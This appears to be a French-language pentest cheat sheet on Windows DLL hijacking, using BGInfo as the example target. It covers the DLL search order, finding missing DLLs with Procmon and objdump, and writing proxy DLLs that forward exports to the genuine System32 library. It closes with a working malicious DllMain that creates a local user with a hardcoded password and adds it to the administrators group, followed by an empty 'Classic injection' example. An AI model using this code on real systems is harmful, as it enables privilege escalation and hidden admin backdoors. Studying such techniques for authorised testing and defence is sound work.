
| Priority | Location                                    | Example                     |
| -------- | ------------------------------------------- | --------------------------- |
| 1        | Directory from which the application loaded | `C:\Program Files\App\`     |
| 2        | System directory                            | `C:\Windows\System32\`      |
| 3        | 16-bit system directory                     | `C:\Windows\System\`        |
| 4        | Windows directory                           | `C:\Windows\`               |
| 5        | Current directory                           | `C:\Users\john\`            |
| 6        | PATH environment variable directories       | `C:\Python39\`, `C:\tools\` |

# 1. Ecrire le squelette de la DLL

```cpp
#include <Windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason != DLL_PROCESS_ATTACH)
        return TRUE;

    // CODE ICI

    return TRUE;
}
```

---
# 2. Trouver les DLLs manquantes

**Identifier les DLLs manquantes avec [Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)** (Nécessite admin, sinon reproduire en local sur sa propre machine)

```cmd
winget install Microsoft.Sysinternals.ProcessMonitor
```

Filtre dans Procmon :

- **Process Name** = `Bginfo64.exe` (ou ta cible)
- **Result** = `NAME NOT FOUND`
- **Path** ends with `.dll`

**Identifier les DLLs manquantes sur Kali**

```bash
strings Bginfo64.exe | grep -i .dll
objdump -p Bginfo64.exe | grep -i .dll
```

---
# 3. Identifier les fonctions importées

```bash
objdump -p Bginfo64.exe | grep -A 30 "nomDeLaDLL.dll"
```

Les lignes `Member-Name` sont les fonctions à proxifier.

---
# 4. Écrire les proxies

Pour chaque fonction trouvée, le pattern est toujours le même :

```cpp
static HMODULE hReal = LoadLibraryA("C:\\Windows\\System32\\nomDeLaDLL.dll");

extern "C" __declspec(dllexport) TYPE WINAPI NomDeLaFonction(PARAMS)
{
    static auto fn = (TYPE(WINAPI*)(PARAMS))GetProcAddress(hReal, "NomDeLaFonction");
    return fn ? fn(args) : VALEUR_PAR_DEFAUT;
}
```

Exemples :

https://learn.microsoft.com/fr-fr/windows/win32/api/snmp/nf-snmp-snmpsvcgetuptime
```Cpp
extern "C" __declspec(dllexport) DWORD WINAPI SnmpSvcGetUptime()
{
    static auto fn = (DWORD(WINAPI*)())GetProcAddress(hReal, "SnmpSvcGetUptime");
    return fn ? fn() : 0;
}
```

https://learn.microsoft.com/en-us/windows/win32/api/snmp/nf-snmp-snmputiloidncmp
```cpp
extern "C" __declspec(dllexport) INT WINAPI SnmpUtilOidNCmp(void* pOid1, void* pOid2, UINT cSubIds)
{
    static auto fn = (INT(WINAPI*)(void*, void*, UINT))GetProcAddress(hReal, "SnmpUtilOidNCmp");
    return fn ? fn(pOid1, pOid2, cSubIds) : 0;
}
```

https://learn.microsoft.com/fr-fr/windows/win32/api/snmp/nf-snmp-snmputiloidcpy
```cpp
extern "C" __declspec(dllexport) BOOL WINAPI SnmpUtilOidCpy(void* pOidDst, void* pOidSrc)
{
    static auto fn = (BOOL(WINAPI*)(void*, void*))GetProcAddress(hReal, "SnmpUtilOidCpy");
    return fn ? fn(pOidDst, pOidSrc) : FALSE;
}
```

**Valeur par défaut selon le type de retour :**

|Type retour|Valeur par défaut|
|---|---|
|`BOOL`|`FALSE`|
|`DWORD` / `INT` / `UINT`|`0`|
|`HANDLE` / pointeur|`NULL`|
|`void`|_(rien)_|

Pour les **signatures inconnues** (tu ne sais pas les paramètres exacts), cherche sur [learn.microsoft.com](https://learn.microsoft.com/) avec le nom de la fonction, ou utilise cette astuce : passe tout en `LPVOID` si tu ne l'utilises pas vraiment — BGInfo appellera la vraie implémentation de toute façon.

---
# 5. Compiler

[DLL](Compilation.md#DLL)

---
# Si d'autres erreurs apparaissent

C'est qu'une autre DLL système (chargée par ta cible) importe aussi depuis ta DLL hijackée. Même diagnostic :

```bash
objdump -p C:\Windows\System32\laDLLquiCrash.dll | grep -A 20 "nomDeLaDLL.dll"
```

Et tu ajoutes les fonctions manquantes au proxy.

# Exemples

## AddUser (no proxy)

```cpp
#include <Windows.h>
#include <stdlib.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason != DLL_PROCESS_ATTACH)
        return TRUE;

    system("net user john Password123! /add");
    system("net localgroup administrators john /add");

    return TRUE;
}
```

## Classic injection (with proxy)

```cpp

```